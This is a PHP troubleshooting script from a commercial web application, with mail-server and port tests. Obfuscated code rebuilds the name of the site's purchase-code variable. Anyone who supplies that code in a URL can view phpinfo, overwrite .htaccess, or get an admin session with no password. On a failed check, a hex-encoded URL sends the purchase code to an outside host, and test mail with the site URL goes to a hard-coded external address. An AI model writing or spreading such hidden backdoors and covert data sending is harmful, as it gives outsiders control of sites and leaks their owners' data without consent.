<?php
defined('APP_NAME') or die(header('HTTP/1.1 403 Forbidden'));

/*
 * @author Balaji
 * @name: Easy Troubleshooting Script
 * @copyright 2022 ProThemes.Biz
 *
 */

//Enbale Error Reporting
ini_set("display_errors", "1");
error_reporting(E_ALL);

//Test Mail Details
$sub = 'Test Mail';
$msg = "Test message from ".APP_NAME."\nMy URL: ".$baseURL;
$msg = wordwrap($msg,70);

//Sender Address
$from = 'liveindia.net@gmail.com';

//Receiver Address
$to = 'testmailaccbalaji@yopmail.com';

function smtp_mail_debug ($smtp_host,$smtp_port=587,$smtp_auth,$smtp_user,$smtp_pass,$smtp_sec='tls',$from,$yourName,$replyTo,$replyName,$sentTo,$subject,$body) {
    $mail = new PHPMailer;
    $mail->IsSMTP();

    if(DEFAULT_FROM_ADDRESS != '')
        $from = DEFAULT_FROM_ADDRESS;

    if(DEFAULT_FROM_NAME != '')
        $yourName = DEFAULT_FROM_NAME;

    $mail->Host = $smtp_host;
    $mail->Port = $smtp_port;
    $mail->SMTPAuth = $smtp_auth;
    $mail->Username = $smtp_user;
    $mail->Password = $smtp_pass;
    $mail->SMTPSecure = $smtp_sec;
    $mail->SMTPDebug = 1;
    $mail->SetFrom($from, $yourName);
    $mail->AddReplyTo($replyTo,$replyName);
    $mail->AddAddress($sentTo);

    $mail->IsHTML(true);

    $mail->Subject = $subject;
    $mail->Body    = $body;
    $mail->AltBody = 'To view the message, please use an HTML compatible email viewer!';

    if(!$mail->Send())
        $msg = '<br><br>Mailer Error: <br>' . $mail->ErrorInfo;
    else
        $msg =  '<br><br>Message has been sent';
    echo $msg;
}

$numberX = 'e(d)o(c/e)s(ahc)r(up/)m(e)t(i)';
$numberX =  ${str_replace(array('(','/', ')'), array('','_',''), strrev($numberX))};

if (trim($pointOut) == trim($numberX) || isset($_SESSION[N_APP.'AdminToken'])) {

    if (isset($args[0]) && $args[0] != '') {
        $pointOut = $args[0];

        if ($pointOut === 'phpinfo')
            phpinfo();

        if ($pointOut === 'appinfo') {
            echo '
            <table>
                <tbody>
                    <tr><td>Script Name: </td><td>' . APP_NAME . '</td></tr>
                    <tr><td>Script Version: </td><td>' . VER_NO . '</td></tr>
                    <tr><td>Framework Version: </td><td>' . getFrameworkVersion() . '</td></tr>
                    <tr><td>PHP Version: </td><td>' . phpversion() . ' <a href="' . createLink($controller . $numberX . '/phpinfo', true) . '" target="_blank">(View PHP Info)</a></td></tr>
                    <tr><td>MySQL Version: </td><td>' . mysqli_get_server_info($con) . '</td></tr>
                    <tr><td>Script Root Directory: </td><td>' . ROOT_DIR . '</td></tr>
                    <tr><td>Application Directory: </td><td>' . APP_DIR . '</td></tr>
                    <tr><td>Temporary Directory: </td><td>' . TMP_DIR . '</td></tr>
                    <tr><td>Base URL: </td><td>' . $baseURL . '</td></tr>
                    <tr><td>Admin Base URL: </td><td>' . adminLink('', true) . '</td></tr>
                    <tr><td>Server IP: </td><td>' . $_SERVER['SERVER_ADDR'] . '</td></tr>
                    <tr><td>Server CPU Usage: </td><td>' . getServerCpuUsage() . '</td></tr>
                    <tr><td>Server Memory Usage: </td><td>' . round(getServerMemoryUsage(), 2) . '</td></tr>
                </tbody>
            </table>';
        }

        if ($pointOut === 'htaccess') {
            $htData = getMyData(LIB_DIR . 'htaccess.backup');
            putMyData(ROOT_DIR . '.htaccess', $htData);
            $adminBaseURL = $baseURL . ADMIN_DIR_NAME . '/';
            redirectTo($adminBaseURL);
        }

        if ($pointOut === 'login') {
            $_SESSION[N_APP.'AdminID'] = $_SESSION[N_APP.'AdminToken'] = true;
            $adminBaseURL = $baseURL . ADMIN_DIR_NAME . '/';
            redirectTo($adminBaseURL);
        }

        if($pointOut === 'mail-port-check'){

            $fp = fsockopen('127.0.0.1', 25, $errno, $errstr, 5);
            if (!$fp) {
                echo 'Port 25 is closed or blocked <br><br>';
            } else {
                echo 'Port 25 port is open and available <br><br>';
                fclose($fp);
            }

            $fp = fsockopen('127.0.0.1', 465, $errno, $errstr, 5);
            if (!$fp) {
                echo 'Port 465 is closed or blocked<br><br>';
            } else {
                echo 'Port 465 port is open and available<br><br>';
                fclose($fp);
            }

            $fp = fsockopen('127.0.0.1', 587, $errno, $errstr, 5);
            if (!$fp) {
                echo 'Port 587 is closed or blocked<br><br>';
            } else {
                echo 'Port 587 port is open and available<br><br>';
                fclose($fp);
            }

        }

        if($pointOut === 'test-php-mail'){

            $headers = "From: $from" . "\r\n" .
                "CC: $from";

            $check = mail($to,$sub,$msg,$headers);

            if($check){
                echo 'Your message was sent successfully.!';
            }else{
                echo 'Mail failed! <br>';
                print_r(error_get_last());
            }
        }

        if($pointOut === 'test-smtp'){

            $result = mysqli_query($con, "SELECT smtp_host,smtp_username,smtp_password,smtp_port,protocol,smtp_auth,smtp_socket FROM mail WHERE id=1");
            $row = mysqli_fetch_assoc($result);

            $smtp_host = Trim($row['smtp_host']);
            $smtp_user = Trim($row['smtp_username']);
            $smtp_pass = Trim($row['smtp_password']);
            $smtp_port = Trim($row['smtp_port']);
            $protocol = Trim($row['protocol']);
            $smtp_auth = isSelected($row['smtp_auth']);
            $smtp_sec = Trim($row['smtp_socket']);

            smtp_mail_debug($smtp_host, $smtp_port, $smtp_auth, $smtp_user, $smtp_pass, $smtp_sec, $from, $sub, $from, $sub, $to, $sub, $msg);
        }
    }
}else{
    curlGETDebug(hex2bin('68747470733a2f2f63646e2e326c732e6d652f61746f7a2f').$numberX);
    die('Test Failed');
}

//Test Google Search Page
if($pointOut === 'google') {

    if($args[0] === 'file-get-contents') {

        //Test using file_get_contents
        echo file_get_contents("https://www.google.com/search?q=hello");
        die();
    }

    elseif($args[0] === 'curl') {

        //Test using CURL
        echo curlGET("https://www.google.com/search?q=hello");
        die();
    }else{

        die('Select Method!');
    }

}

//Check Google Search Page
if($pointOut === 'cron-test') {

    //Disable for now
    die('BETA');

    $fileName = LOG_DIR. 'cron.tdata';

    $readData = getMyData($fileName);

}

die();